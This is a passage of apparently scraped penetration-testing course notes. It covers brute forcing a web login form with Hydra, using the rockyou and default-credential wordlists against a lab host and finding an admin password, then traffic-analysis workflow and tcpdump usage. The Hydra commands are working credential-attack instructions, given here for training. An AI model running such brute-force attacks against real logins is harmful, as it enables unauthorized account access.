to the admin panel. hrmns@htb[/htb]$ hydra -l admin -P /opt/useful/SecLists/Passwords/Leaked-Databases/rockyou.txt -f 178 .35.49.134 -s 32901 http-post-form \"/login.php:username=^USER^&password=^PASS^:F=<form name='login'\" Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway). Hydra (https://github.com/vanhauser-thc/thc-hydra) [WARNING] Restorefile (ignored ...) from a previous session found, to prevent overwriting, ./hydra.restore [DATA] max 16 tasks per 1 server, overall 16 tasks, 14344398 login tries (l:1/p:14344398), ~896525 tries per task [DATA] attacking http-post-form://178.35.49.134:32901/login.php:username=^USER^&password=^PASS^:F=<form name='login' [PORT][http-post-form] host: 178.35.49.134 login: admin password: password123 [STATUS] attack finished for 178.35.49.134 (valid pair found) 1 of 1 target successfully completed, 1 valid password found Hydra (https://github.com/vanhauser-thc/thc-hydra)","title":"Web Forms Brute Forcing"},{"location":"login_brute_forcing/web_forms_brute_forcing/#brute-forcing-forms","text":"Hydra provides many different types of requests we can use to brute force different services. If we use hydra -h, we should be able to list supported services: hrmns@htb[/htb]$ hydra -h | grep \"Supported services\" | tr \":\" \"\\n\" | tr \" \" \"\\n\" | column -e Supported ldap3[-{cram|digest}md5][s] rsh services memcached rtsp mongodb s7-300 adam6500 mssql sip asterisk mysql smb cisco nntp smtp[s] cisco-enable oracle-listener smtp-enum cvs oracle-sid snmp firebird pcanywhere socks5 ftp[s] pcnfs ssh http[s]-{head|get|post} pop3[s] sshkey http[s]-{get|post}-form postgres svn http-proxy radmin2 teamspeak http-proxy-urlenum rdp telnet[s] icq redis vmauthd imap[s] rexec vnc irc rlogin xmpp ldap2[s] rpcap Login.php When we try to log in with any credentials and don't see any of our input in the URL, and the URL does not change, we know that the web application uses a POST form. f our target URL shows http, in this case, we should use the http-post-form module. To find out how to use the http-post-form module , we can use the \" -U \" flag to list the parameters it requires and examples of usage: hrmns@htb[/htb]$ hydra http-post-form -U <...SNIP...> Syntax: <url>:<form parameters>:<condition string>[:<optional>[:<optional>] First is the page on the server to GET or POST to (URL). Second is the POST/GET variables ...SNIP... usernames and passwords being replaced in the \"^USER^\" and \"^PASS^\" placeholders The third is the string that it checks for an *invalid* login (by default) Invalid condition login check can be preceded by \"F=\", successful condition login check must be preceded by \"S=\". <...SNIP...> Examples: \"/login.php:user=^USER^&pass=^PASS^:incorrect\" In summary, we need to provide three parameters, separated by :, as follows: URL path, which holds the login form POST parameters for username/password A failed/success login string, which lets hydra recognize whether the login attempt was successful or not For the first parameter, we know the URL path is: /login.php The second parameter is the POST parameters for username/passwords: /login.php:[user parameter]=^USER^&[password parameter]=^PASS^ The third parameter is a failed/successful login attempt string. We cannot log in, so we do not know how the page would look like after a successful login, so we cannot specify a success string to look for. /login.php:[user parameter]=^USER^&[password parameter]=^PASS^:[FAIL/SUCCESS]=[success/failed string]","title":"Brute Forcing Forms"},{"location":"login_brute_forcing/web_forms_brute_forcing/#failsuccess-string","text":"To make it possible for hydra to distinguish between successfully submitted credentials and failed attempts, we have to specify a unique string from the source code of the page we're using to log in. Hydra will examine the HTML code of the response page it gets after each attempt, looking for the string we provided. If we provide a fail string, it will keep looking until the string is not found in the response. Another way is if we provide a success string, it will keep looking until the string is found in the response. We can click [Ctrl + U] in Firefox to show the HTML page source, and search for login : < form name = 'login' autocomplete = 'off' class = 'form' action = '' method = 'post' > We will use <form name='login' , which should be distinct enough and will probably not exist after a successful login. So, our syntax for the http-post-form should be as follows: \"/login.php:[user parameter]=^USER^&[password parameter]=^PASS^:F=<form name='login'\"","title":"Fail/Success String"},{"location":"login_brute_forcing/web_forms_brute_forcing/#determine-login-parameters","text":"Using Burp Go to Firefox and enable the Burp Proxy . Attempt a login with any username/password 'e.g. admin:admin', and go back to BurpSuite, to find the login request captured: username=admin&password=admin To use in a hydra http-post-form , we can take it as is, and replace the username/password we used admin:admin with USER and PASS . The specification of our final target path should be as follows: \"/login.php:username=^USER^&password=^PASS^:F=<form name='login'\"","title":"Determine Login Parameters"},{"location":"login_brute_forcing/web_forms_brute_forcing/#login-form-attacks","text":"Default Credentials Let's try to use the ftp-betterdefaultpasslist.txt list with the default credentials to test if one of the accounts is registered in the web application. hrmns@htb[/htb]$ hydra -C /opt/useful/SecLists/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt 178 .35.49.134 -s 32901 http-post-form \"/login.php:username=^USER^&password=^PASS^:F=<form name='login'\" Hydra v9.1 (c) d020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway). Hydra (https://github.com/vanhauser-thc/thc-hydra) [DATA] max 16 tasks per 1 server, overall 16 tasks, 66 login tries, ~5 tries per task [DATA] attacking http-post-form://178.35.49.134:32901/login.php:username=^USER^&password=^PASS^:F=<form name='login' 1 of 1 target completed, 0 valid password found Hydra (https://github.com/vanhauser-thc/thc-hydra) We were not able to identify any working credentials. Still, this only took a few seconds, and we ruled out the use of default passwords. Now, we can move on to use a password wordlist.","title":"Login Form Attacks"},{"location":"login_brute_forcing/web_forms_brute_forcing/#password-wordlist","text":"Since the brute force attack failed using default credentials, we can try to brute force the web application form with a specified user. Often usernames such as admin, administrator, wpadmin, root, adm, and similar are used in administration panels and are rarely changed. Knowing this fact allows us to limit the number of possible usernames. The most common username administrators use is admin . In this case, we specify this username for our next attempt to get access to the admin panel. hrmns@htb[/htb]$ hydra -l admin -P /opt/useful/SecLists/Passwords/Leaked-Databases/rockyou.txt -f 178 .35.49.134 -s 32901 http-post-form \"/login.php:username=^USER^&password=^PASS^:F=<form name='login'\" Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway). Hydra (https://github.com/vanhauser-thc/thc-hydra) [WARNING] Restorefile (ignored ...) from a previous session found, to prevent overwriting, ./hydra.restore [DATA] max 16 tasks per 1 server, overall 16 tasks, 14344398 login tries (l:1/p:14344398), ~896525 tries per task [DATA] attacking http-post-form://178.35.49.134:32901/login.php:username=^USER^&password=^PASS^:F=<form name='login' [PORT][http-post-form] host: 178.35.49.134 login: admin password: password123 [STATUS] attack finished for 178.35.49.134 (valid pair found) 1 of 1 target successfully completed, 1 valid password found Hydra (https://github.com/vanhauser-thc/thc-hydra)","title":"Password Wordlist"},{"location":"network_traffic_analysis/analysis/","text":"Descriptive Analysis \u00b6 Descriptive analysis is an essential step in any data analysis. It serves to describe a data set based on individual characteristics. It helps to detect possible errors in data collection and/or outliers in the data set. What is the issue? Suspected breach? Networking issue? Define our scope and the goal. (what are we looking for? which time period?) Target: multiple hosts potentially downloading a malicious file from bad.example.com When: within the last 48 hours + 2 hours from now. Supporting info: filenames/types 'superbad.exe' 'new-crypto-miner.exe' Define our target(s) (net / host(s) / protocol) Scope: 192.168.100.0/24 network, protocols used were HTTP and FTP. Using our workflow, we will determine our issue, what we are looking for, when, and where to find it. Descriptive analysis covers these critical concepts for our analysis. Diagnostic Analysis \u00b6 Diagnostic analysis clarifies the causes, effects, and interactions of conditions. In doing so, it provides insights that are obtained through correlations and interpretation. Characteristic here is a backward-looking view, as in the closely related descriptive analytics, with the subtle difference that it tries to find reasons for events and developments. Capture network traffic Plug into a link with access to the 192.168.100.0/24 network to capture live traffic to try and grab one of the executables in transfer. See if an admin can pull PCAP and/or netflow data from our SIEM for the historical data. Identification of required network traffic components (filtering) Once we have traffic, filter out any packets not needed for this investigation to include; any traffic that matches our common baseline and keep anything relevant to the scope of the investigation. For example, HTTP and FTP from the subnet, anything transferring or containing a GET request for the suspected executable files. An understanding of captured network traffic Once we have filtered out the noise, it is time to dig for our targets\u2014filter on things like ftp-data to find any files transferred and reconstruct them. For HTTP, we can filter on http.request.method == \"GET\" to see any GET requests that match the filenames we are searching for. This can show us who has acquired the files and potentially other transfers internal to the network on the same protocols. By capturing traffic around the source of our issue, clearing out any known good data, and then taking the time to inspect and understand what is left, we can determine if it is the cause of our problem. In doing so, we just performed diagnostic analysis. We are validating the cause of our problems and examining the events surrounding them. Predictive Analysis \u00b6 By evaluating historical and current data, predictive analysis creates a predictive model for future probabilities. Based on the results of descriptive and diagnostic analyses, this method of data analysis makes it possible to identify trends, detect deviations from expected values at an early stage, and predict future occurrences as accurately as possible. Note-taking and mind mapping of the found results Annotating everything we do, see, or find throughout the investigation is crucial. Ensure we are taking ample notes, including: Timeframes we captured traffic during. Suspicious hosts within the network. Conversations containing the files in question. ( to include timestamps and packet numbers) Summary of the analysis (what did we find?) Finally, summarize what we have found explaining the relevant details so that superiors can decide to quarantine the affected hosts or perform more significant incident response. Our analysis will affect decisions made, so it is essential to be as clear and concise as possible. By performing an evaluation of the data we have found, comparing it to our baseline traffic, and known bad data such as markers of infiltration or exploitation (like signatures for viruses and other hacking tools), we are performing Predictive Analysis. In this process, we paint a clear picture so that appropriate actions can be taken in response. Prescriptive Analysis \u00b6 Prescriptive analysis aims to narrow down what actions to take to eliminate or prevent a future problem or trigger a specific activity or process. Using the results of our workflow, we can make sound decisions as to what actions are required to solve the problem and prevent it from happening again. To prescribe a solution is the culmination of this workflow. Once done and the problem is solved, it is prudent to reflect on the entire process and develop lessons learned. These lessons, when documented, will enable us to make our processes stronger\u2014document what was done correctly, what actions failed to help, and what could improve. This workflow is an example of how to begin the analysis process on captured traffic. Above we broke it down into its parts to explain where they fit within the analysis process and with which type of analysis it belongs. We include it here again as a whole so that it can serve as a template. What is the issue? Suspected breach? Networking issue? Define our scope and the goal (what are we looking for? which time period?) target: multiple hosts potentially downloading a malicious file from bad.example.com when: within the last 48 hours + 2 hours from now. supporting info: filenames/types 'superbad.exe' 'new-crypto-miner.exe' Define our target(s) (net / host(s) / protocol) scope: 192.168.100.0/24 network protocols used were HTTP and FTP. Capture network traffic plug into a link with access to the 192.168.100.0/24 network to capture live traffic to try and grab one of the executables in transfer. See if an admin can pull PCAP and/or netflow data from our SIEM for the historical data. Identification of required network traffic components (filtering) once we have traffic, filter out any traffic not needed for this investigation to include; any traffic that matches our common baseline and keep anything relevant to the scope. `HTTP and FTP from the subnet, anything transferring or containing a GET request for the suspected executable files. An understanding of captured network traffic Once we have filtered out the noise, it's time to dig for our targets\u2014filter on things like ftp-data to find any files transferred and reconstruct them. For HTTP, we can filter on http.request.method == \"GET\" to see any GET requests that match the filenames we are searching for. This can show us who has acquired the files and potential other transfers internal to the network on the same protocols. Note-taking and mind mapping of the found results. Annotating everything we do, see, or find throughout the investigation is crucial. Ensure we are taking ample notes, including: Timeframes we captured traffic during. Suspicious hosts within the network. Conversations containing the files in question. ( to include timestamps and packet numbers) Summary of the analysis (what did we find?) Finally, summarize what has been found, explaining the relevant details so that superiors can make an informed decision to quarantine the affected hosts or perform more significant incident response. Our analysis will affect decisions made, so it is essential to be as clear and concise as possible. Often this process is not a once-and-done kind of thing. It is usually cyclic, and we will need to rerun steps based on our analysis of the original capture to build a bigger picture. This could have been a much larger attack than what is in the examples. Suppose a full-scale incident response is deemed necessary. In that case, we may have to reanalyze the PCAP previously captured to look at any conversations that involve the affected hosts within several minutes of the executable transfer to ensure it did not spread over another route, as an example. Key Components of an Effective Analysis \u00b6 Know your environment There are several key components to perform traffic analysis effectively. First, know the environment. If we are unsure if a host belongs in the network, how can we determine if it is rogue or not? Keeping asset inventories and network maps is vital. These will aid in the analysis process. Placement is Key The placement of our host for capturing traffic is a critical thing. Closest to the source of the issue is the ideal placement of our capturing tool. If the traffic in question is coming from the internet, listening to the inbound links is a great way to see the complete picture. It is as close to the source as we, the administrators, can get. If the problem seems to be isolated to one host on our internal network, try placing the capture tools in the same segment as the problem host and see what traffic is happening within the segment. Persistence Persistence is the next critical component for us. The issue will not always be easy to spot. It may not even be a frequent event on the network. For example, an attacker's Command and Control server reaching out to the victim's computers may only happen on a time interval of once every several hours, or even once a day or less. This means that if we did not catch it the first time around, it might be a while before it appears in our logs. Don't lose the drive to find the problem. It could mean the difference between stopping the attacker and a full-scale breach like a ransomware attack.","title":"Analysis"},{"location":"network_traffic_analysis/analysis/#descriptive-analysis","text":"Descriptive analysis is an essential step in any data analysis. It serves to describe a data set based on individual characteristics. It helps to detect possible errors in data collection and/or outliers in the data set. What is the issue? Suspected breach? Networking issue? Define our scope and the goal. (what are we looking for? which time period?) Target: multiple hosts potentially downloading a malicious file from bad.example.com When: within the last 48 hours + 2 hours from now. Supporting info: filenames/types 'superbad.exe' 'new-crypto-miner.exe' Define our target(s) (net / host(s) / protocol) Scope: 192.168.100.0/24 network, protocols used were HTTP and FTP. Using our workflow, we will determine our issue, what we are looking for, when, and where to find it. Descriptive analysis covers these critical concepts for our analysis.","title":"Descriptive Analysis"},{"location":"network_traffic_analysis/analysis/#diagnostic-analysis","text":"Diagnostic analysis clarifies the causes, effects, and interactions of conditions. In doing so, it provides insights that are obtained through correlations and interpretation. Characteristic here is a backward-looking view, as in the closely related descriptive analytics, with the subtle difference that it tries to find reasons for events and developments. Capture network traffic Plug into a link with access to the 192.168.100.0/24 network to capture live traffic to try and grab one of the executables in transfer. See if an admin can pull PCAP and/or netflow data from our SIEM for the historical data. Identification of required network traffic components (filtering) Once we have traffic, filter out any packets not needed for this investigation to include; any traffic that matches our common baseline and keep anything relevant to the scope of the investigation. For example, HTTP and FTP from the subnet, anything transferring or containing a GET request for the suspected executable files. An understanding of captured network traffic Once we have filtered out the noise, it is time to dig for our targets\u2014filter on things like ftp-data to find any files transferred and reconstruct them. For HTTP, we can filter on http.request.method == \"GET\" to see any GET requests that match the filenames we are searching for. This can show us who has acquired the files and potentially other transfers internal to the network on the same protocols. By capturing traffic around the source of our issue, clearing out any known good data, and then taking the time to inspect and understand what is left, we can determine if it is the cause of our problem. In doing so, we just performed diagnostic analysis. We are validating the cause of our problems and examining the events surrounding them.","title":"Diagnostic Analysis"},{"location":"network_traffic_analysis/analysis/#predictive-analysis","text":"By evaluating historical and current data, predictive analysis creates a predictive model for future probabilities. Based on the results of descriptive and diagnostic analyses, this method of data analysis makes it possible to identify trends, detect deviations from expected values at an early stage, and predict future occurrences as accurately as possible. Note-taking and mind mapping of the found results Annotating everything we do, see, or find throughout the investigation is crucial. Ensure we are taking ample notes, including: Timeframes we captured traffic during. Suspicious hosts within the network. Conversations containing the files in question. ( to include timestamps and packet numbers) Summary of the analysis (what did we find?) Finally, summarize what we have found explaining the relevant details so that superiors can decide to quarantine the affected hosts or perform more significant incident response. Our analysis will affect decisions made, so it is essential to be as clear and concise as possible. By performing an evaluation of the data we have found, comparing it to our baseline traffic, and known bad data such as markers of infiltration or exploitation (like signatures for viruses and other hacking tools), we are performing Predictive Analysis. In this process, we paint a clear picture so that appropriate actions can be taken in response.","title":"Predictive Analysis"},{"location":"network_traffic_analysis/analysis/#prescriptive-analysis","text":"Prescriptive analysis aims to narrow down what actions to take to eliminate or prevent a future problem or trigger a specific activity or process. Using the results of our workflow, we can make sound decisions as to what actions are required to solve the problem and prevent it from happening again. To prescribe a solution is the culmination of this workflow. Once done and the problem is solved, it is prudent to reflect on the entire process and develop lessons learned. These lessons, when documented, will enable us to make our processes stronger\u2014document what was done correctly, what actions failed to help, and what could improve. This workflow is an example of how to begin the analysis process on captured traffic. Above we broke it down into its parts to explain where they fit within the analysis process and with which type of analysis it belongs. We include it here again as a whole so that it can serve as a template. What is the issue? Suspected breach? Networking issue? Define our scope and the goal (what are we looking for? which time period?) target: multiple hosts potentially downloading a malicious file from bad.example.com when: within the last 48 hours + 2 hours from now. supporting info: filenames/types 'superbad.exe' 'new-crypto-miner.exe' Define our target(s) (net / host(s) / protocol) scope: 192.168.100.0/24 network protocols used were HTTP and FTP. Capture network traffic plug into a link with access to the 192.168.100.0/24 network to capture live traffic to try and grab one of the executables in transfer. See if an admin can pull PCAP and/or netflow data from our SIEM for the historical data. Identification of required network traffic components (filtering) once we have traffic, filter out any traffic not needed for this investigation to include; any traffic that matches our common baseline and keep anything relevant to the scope. `HTTP and FTP from the subnet, anything transferring or containing a GET request for the suspected executable files. An understanding of captured network traffic Once we have filtered out the noise, it's time to dig for our targets\u2014filter on things like ftp-data to find any files transferred and reconstruct them. For HTTP, we can filter on http.request.method == \"GET\" to see any GET requests that match the filenames we are searching for. This can show us who has acquired the files and potential other transfers internal to the network on the same protocols. Note-taking and mind mapping of the found results. Annotating everything we do, see, or find throughout the investigation is crucial. Ensure we are taking ample notes, including: Timeframes we captured traffic during. Suspicious hosts within the network. Conversations containing the files in question. ( to include timestamps and packet numbers) Summary of the analysis (what did we find?) Finally, summarize what has been found, explaining the relevant details so that superiors can make an informed decision to quarantine the affected hosts or perform more significant incident response. Our analysis will affect decisions made, so it is essential to be as clear and concise as possible. Often this process is not a once-and-done kind of thing. It is usually cyclic, and we will need to rerun steps based on our analysis of the original capture to build a bigger picture. This could have been a much larger attack than what is in the examples. Suppose a full-scale incident response is deemed necessary. In that case, we may have to reanalyze the PCAP previously captured to look at any conversations that involve the affected hosts within several minutes of the executable transfer to ensure it did not spread over another route, as an example.","title":"Prescriptive Analysis"},{"location":"network_traffic_analysis/analysis/#key-components-of-an-effective-analysis","text":"Know your environment There are several key components to perform traffic analysis effectively. First, know the environment. If we are unsure if a host belongs in the network, how can we determine if it is rogue or not? Keeping asset inventories and network maps is vital. These will aid in the analysis process. Placement is Key The placement of our host for capturing traffic is a critical thing. Closest to the source of the issue is the ideal placement of our capturing tool. If the traffic in question is coming from the internet, listening to the inbound links is a great way to see the complete picture. It is as close to the source as we, the administrators, can get. If the problem seems to be isolated to one host on our internal network, try placing the capture tools in the same segment as the problem host and see what traffic is happening within the segment. Persistence Persistence is the next critical component for us. The issue will not always be easy to spot. It may not even be a frequent event on the network. For example, an attacker's Command and Control server reaching out to the victim's computers may only happen on a time interval of once every several hours, or even once a day or less. This means that if we did not catch it the first time around, it might be a while before it appears in our logs. Don't lose the drive to find the problem. It could mean the difference between stopping the attacker and a full-scale breach like a ransomware attack.","title":"Key Components of an Effective Analysis"},{"location":"network_traffic_analysis/layers/","text":"Protocol Data Units ( PDU ). A PDU is a data packet made up of control information and data encapsulated from each layer of the OSI model. When inspecting a PDU, we need to keep the idea of encapsulation in mind. As our data moves down the protocol stack, each layer will wrap the previous layers' data in a new bubble we call encapsulation. This bubble adds the necessary information of that layer into the header of the PDU. This information can vary by level, but it includes what is held by the previous layer, operational flags, any options required to negotiate communications, the source and destination IP addresses, ports, transport, and application layer protocols.","title":"Layers"},{"location":"network_traffic_analysis/tcpdump_fundamentals/","text":"Tcpdump is a command-line packet sniffer that can directly capture and interpret data frames from a file or network interface. It was built for use on any Unix-like operating system and had a Windows twin called WinDump . To validate if the package exists on our host hrmns@htb[/htb]$ which tcpdump Tcpdump Version Validation hrmns@htb[/htb]$ sudo tcpdump --version tcpdump version 4.9.3 libpcap version 1.9.1 (with TPACKET_V3) OpenSSL 1.1.1f 31 Mar 2020 Table of basic Tcpdump switches we can use to modify how our captures run Switch Command Result D Will display any interfaces available to capture from. i Selects an interface to capture from. ex. -i eth0 n Do not resolve hostnames. nn Do not resolve hostnames or well-known ports. e Will grab the ethernet header along with upper-layer data. X Show Contents of packets in hex and ASCII. XX Same as X, but will also specify ethernet headers. (like using Xe) v, vv, vvv Increase the verbosity of output shown and saved. c Grab a specific number of packets, then quit the program. s Defines how much of a packet to grab. S change relative sequence numbers in the capture display to absolute sequence numbers. (13248765839 instead of 101) q Print less protocol information. r file.pcap Read from a file. w file.pcap Write into a file Listing Available Interfaces hrmns@htb[/htb]$ sudo tcpdump -D 1.eth0 [Up, Running, Connected] 2.any (Pseudo-device that captures on all interfaces) [Up, Running] 3.lo [Up, Running, Loopback] 4.bluetooth0 (Bluetooth adapter number 0) [Wireless, Association status unknown] 5.bluetooth-monitor (Bluetooth Linux Monitor) [Wireless] 6.nflog (Linux netfilter log (NFLOG) interface) [none] 7.nfqueue (Linux netfilter queue (NFQUEUE) interface) [none] 8.dbus-system (D-Bus system bus) [none] 9.dbus-session (D-Bus session bus) [none Choosing an Interface to Capture From hrmns@htb[/htb]$ sudo tcpdump -i eth0 tcpdump: verbose output suppressed, use -v[v]... for full protocol decode listening on eth0, link-type EN10MB (Ethernet), snapshot length 262144 bytes 10:58:33.719241 IP 172.16.146.2.55260 > 172.67.1.1.https: Flags [P.], seq 1953742992:1953743073, ack 2034210498, win 501, length 81 10:58:33.747853 IP 172.67.1.1.https > 172.16.146.2.55260: Flags [.], ack 81, win 158, length 0 10:58:33.750393 IP 172.16.146.2.52195 > 172.16.146.1.domain: 7579+ PTR? 1.1.67.172.in-addr.arpa. (41) Disable Name Resolution hrmns@htb[/htb]$ sudo tcpdump -i eth0 -nn tcpdump: verbose output suppressed, use -v[v]... for full protocol decode listening on eth0, link-type EN10MB (Ethernet), snapshot length 262144 bytes 11:02:35.580449 IP 172.16.146.2.48402 > 52.31.199.148.443: Flags [P.], seq 988167196:988167233, ack 1512376150, win 501, options [nop,nop,TS val 214282239 ecr 77421665], length 37 11:02:35.588695 IP 172.16.146.2.55272 > 172.67.1.1.443: Flags [P.], seq 940648841:940648916, ack 4248406693, win 501, length 75 11:02:35.654368 IP 172.67.1.1.443 > 172.16.146.2.55272: Flags [.], ack 75, win 70, length 0 11:02:35.728889 IP 52.31.199.148.443 > 172.16.146.2.48402: Flags [P.], seq 1:34, ack 37, win 118, options [nop,nop,TS val 77434740 ecr 214282239], length 33 11:02:35.728988 IP 172.16.146.2.48402 > 52.31.199.148.443: Flags [.], ack 34, win 501, options [nop,nop,TS val 214282388 ecr 77434740], length 0 11:02:35.729073 IP 52.31.199.148.443 > 172.16.146.2.48402: Flags [P.], seq 34:65, ack 37, win 118, options [nop,nop,TS val 77434740 ecr 214282239], length 31 11:02:35.729081 IP 172.16.146.2.48402 > 52.31.199.148.443: Flags [.], ack 65, win 501, options [nop,nop,TS val 214282388 ecr 77434740], length 0 11:02:35.729348 IP 52.31.199.148.443 > 172.16.146.2.48402: Flags [F.], seq 65, ack 37, win 118, options [nop,nop,TS val 77434740 ecr 214282239], length 0 Display the Ethernet Header hrmns@htb[/htb]$ sudo tcpdump -i eth0 -e tcpdump: verbose output suppressed, use -v[v]... for full protocol decode listening on eth0, link-type EN10MB (Ethernet), snapshot length 262144 bytes 11:05:45.982115 00:0c:29:97:52:65 (oui Unknown) > 8a:66:5a:11:8d:64 (oui Unknown), ethertype IPv4 (0x0800), length 103: 172.16.146.2.57142 > ec2-99-80-22-207.eu-west-1.compute.amazonaws.com.https: Flags [P.], seq 922951468:922951505, ack 1842875143, win 501, options [nop,nop,TS val 1368272062 ecr 65637925], length 37 11:05:45.989652 00:0c:29:97:52:65 (oui Unknown) > 8a:66:5a:11:8d:64 (oui Unknown), ethertype IPv4 (0x0800), length 129: 172.16.146.2.55272 > 172.67.1.1.https: Flags [P.], seq 940656124:940656199, ack 4248413119, win 501, length 75 11:05:46.047731 00:0c:29:97:52:65 (oui Unknown) > 8a:66:5a:11:8d:64 (oui Unknown), ethertype IPv4 (0x0800), length 85: 172.16.146.2.54006 > 172.16.146.1.domain: 31772+ PTR? 207.22.80.99.in-addr.arpa. (43) 11:05:46.049134 8a:66:5a:11:8d:64 (oui Unknown) > 00:0c:29:97:52:65 (oui Unknown), ethertype IPv4 (0x0800), length 147: 172.16.146.1.domain > 172.16.146.2.54006: 31772 1/0/0 PTR ec2-99-80-22-207.eu-west-1.compute.amazonaws.com. (105) Include ASCII and Hex Output hrmns@htb[/htb]$ sudo tcpdump -i eth0 -X tcpdump: verbose output suppressed, use -v[v]... for full protocol decode listening on eth0, link-type EN10MB (Ethernet), snapshot length 262144 bytes 11:10:34.972248 IP 172.16.146.2.57170 > ec2-99-80-22-207.eu-west-1.compute.amazonaws.com.https: Flags [P.], seq 2612172989:2612173026, ack 3165195759, win 501, options [nop,nop,TS val 1368561052 ecr 65712142], length 37 0x0000: 4500 0059 4352 4000 4006 3f1b ac10 9202 E..YCR@.@.?..... 0x0010: 6350 16cf df52 01bb 9bb2 98bd bca9 0def cP...R.......... 0x0020: 8018 01f5 b87d 0000 0101 080a 5192 959c .....}......Q... 0x0030: 03ea b00e 1703 0300 2000 0000 0000 0000 ................ 0x0040: 0adb 84ac 34b4 910a 0fb4 2f49 9865 eb45 ....4...../I.e.E 0x0050: 883c eafd 8266 3e23 88 .<...f>#. 11:10:34.984582 IP 172.16.146.2.38732 > 172.16.146.1.domain: 22938+ A? app.hackthebox.eu. (35) 0x0000: 4500 003f 2e6b 4000 4011 901e ac10 9202 E..?.k@.@....... 0x0010: ac10 9201 974c 0035 002b 7c61 599a 0100 .....L.5.+|aY... 0x0020: 0001 0000 0000 0000 0361 7070 0a68 6163 .........app.hac 0x0030: 6b74 6865 626f 7802 6575 0000 0100 01 kthebox.eu..... 11:10:35.055497 IP 172.16.146.2.43116 > 172.16.146.1.domain: 6524+ PTR? 207.22.80.99.in-addr.arpa. (43) 0x0000: 4500 0047 2e72 4000 4011 900f ac10 9202 E..G.r@.@....... 0x0010: ac10 9201 a86c 0035 0033 7c69 197c 0100 .....l.5.3|i.|.. 0x0020: 0001 0000 0000 0000 0332 3037 0232 3202 .........207.22. 0x0030: 3830 0239 3907 696e 2d61 6464 7204 6172 80.99.in-addr.ar 0x0040: 7061 0000 0c00 01 pa..... Pay attention to the level of detail in the output above. We will notice that we have information on the IP header options like time to live, offset, and other flags and more details into the upper layer protocols. Below, we are combining the switches to craft the output to our liking. Tcpdump Switch Combinations hrmns@htb[/htb]$ sudo tcpdump -i eth0 -nnvXX tcpdump: listening on eth0, link-type EN10MB (Ethernet), snapshot length 262144 bytes 11:13:59.149599 IP (tos 0x0, ttl 64, id 24075, offset 0, flags [DF], proto TCP (6), length 89) 172.16.146.2.42454 > 54.77.251.34.443: Flags [P.], cksum 0x6fce (incorrect -> 0xb042), seq 671020720:671020757, ack 3699222968, win 501, options [nop,nop,TS val 1154433101 ecr 1116647414], length 37 0x0000: 8a66 5a11 8d64 000c 2997 5265 0800 4500 .fZ..d..).Re..E. 0x0010: 0059 5e0b 4000 4006 6d11 ac10 9202 364d .Y^.@.@.m.....6M 0x0020: fb22 a5d6 01bb 27fe f6b0 dc7d a9b8 8018 .\"....'....}.... 0x0030: 01f5 6fce 0000 0101 080a 44cf 404d 428e ..o.......D.@MB. 0x0040: aff6 1703 0300 2000 0000 0000 0000 09bb ................ 0x0050: 38d9 d89a 2d70 73d5 a01e 9df7 2c48 5b8a 8...-ps.....,H[. 0x0060: d64d 8e42 2ccc 43 .M.B,.C 11:13:59.157113 IP (tos 0x0, ttl 64, id 31823, offset 0, flags [DF], proto UDP (17), length 63) 172.16.146.2.55351 > 172.16.146.1.53: 26460+ A? app.hackthebox.eu. (35) 0x0000: 8a66 5a11 8d64 000c 2997 5265 0800 4500 .fZ..d..).Re..E. 0x0010: 003f 7c4f 4000 4011 423a ac10 9202 ac10 .?|O@.@.B:...... 0x0020: 9201 d837 0035 002b 7c61 675c 0100 0001 ...7.5.+|ag\\.... 0x0030: 0000 0000 0000 0361 7070 0a68 6163 6b74 .......app.hackt 0x0040: 6865 626f 7802 6575 0000 0100 01 hebox.eu..... 11:13:59.158029 IP (tos 0x0, ttl 64, id 20784, offset 0, flags [none], proto UDP (17), length 111) 172.16.146.1.53 > 172.16.146.2.55351: 26460 3/0/0 app.hackthebox.eu. A 104.20.55.68, app.hackthebox.eu. A 172.67.1.1, app.hackthebox.eu. A 104.20.66.68 (83) 0x0000: 000c 2997 5265 8a66 5a11 8d64 0800 4500 ..).Re.fZ..d..E. 0x0010: 006f 5130 0000 4011 ad29 ac10 9201 ac10 .oQ0..@..)...... 0x0020: 9202 0035 d837 005b 9d2e 675c 8180 0001 ...5.7.[..g\\.... 0x0030: 0003 0000 0000 0361 7070 0a68 6163 6b74 .......app.hackt 0x0040: 6865 626f 7802 6575 0000 0100 01c0 0c00 hebox.eu........ 0x0050: 0100 0100 0000 ab00 0468 1437 44c0 0c00 .........h.7D... 0x0060: 0100 0100 0000 ab00 04ac 4301 01c0 0c00 ..........C..... 0x0070: 0100 0100 0000 ab00 0468 1442 44 .........h.BD 11:13:59.158335 IP (tos 0x0, ttl 64, id 20242, offset 0, flags [DF], proto TCP (6), length 60) 172.16.146.2.55416 > 172.67.1.1.443: Flags [S], cksum 0xeb85 (incorrect -> 0x72f7), seq 3766489491, win 64240, options [mss 1460,sackOK,TS val 508232750 ecr 0,nop,wscale 7], length 0 0x0000: 8a66 5a11 8d64 000c 2997 5265 0800 4500 .fZ..d..).Re..E. 0x0010: 003c 4f12 4000 4006 0053 ac10 9202 ac43 .<O.@.@..S.....C 0x0020: 0101 d878 01bb e080 1193 0000 0000 a002 ...x............ 0x0030: faf0 eb85 0000 0204 05b4 0402 080a 1e4b ...............K 0x0040: 042e 0000 0000 0103 0307 .......... Tcpdump Output \u00b6 Tcpdump Shell Breakdown Filter Result Timestamp Yellow The timestamp field comes first and is configurable to show the time and date in a format we can ingest easily. Protocol Orange This section will tell us what the upper-layer header is. In our example, it shows IP. Source & Destination IP.Port Orange This will show us the source and destination of the packet along with the port number used to connect. Format == IP.port == 172.16.146.2.21 Flags Green This portion shows any flags utilized. Sequence and Acknowledgement Numbers Red This section shows the sequence and acknowledgment numbers used to track the TCP segment. Our example is utilizing low numbers to assume that relative sequence and ack numbers are being displayed. Protocol Options Blue Here, we will see any negotiated TCP values established between the client and server, such as window size, selective acknowledgments, window scale factors, and more. Notes / Next Header White Misc notes the dissector found will be present here. As the traffic we are looking at is encapsulated, we may see more header information for different protocols. In our example, we can see the TCPDump dissector recognizes FTP traffic within the encapsulation to display it for us. File Input/Ouput with Tcpdump \u00b6 Save our PCAP Output to a File hrmns@htb[/htb]$ sudo tcpdump -i 